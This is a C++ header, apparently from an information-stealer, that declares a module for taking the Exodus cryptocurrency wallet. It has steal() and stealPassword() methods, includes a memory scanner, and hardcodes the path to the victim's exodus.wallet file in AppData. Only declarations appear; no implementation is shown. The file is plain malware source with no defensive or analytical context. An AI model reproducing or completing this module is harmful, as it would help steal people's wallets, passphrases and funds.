#include <globals.h>
#include <utils/FileUtils.h>
#include <utils/Utils.h>
#include <features/exodus/memscanner.h>

#pragma once

namespace gritz::features::exodus
{
	class cExodus final
	{
	public:
		std::vector<byte*> steal();
		static std::string stealPassword();
	private:
		const filesystem::path wallet = filesystem::path{ gritz::paths::paths[gritz::AppData] + "Exodus\\exodus.wallet"};
		bool bPassphrase = false;
	};
}
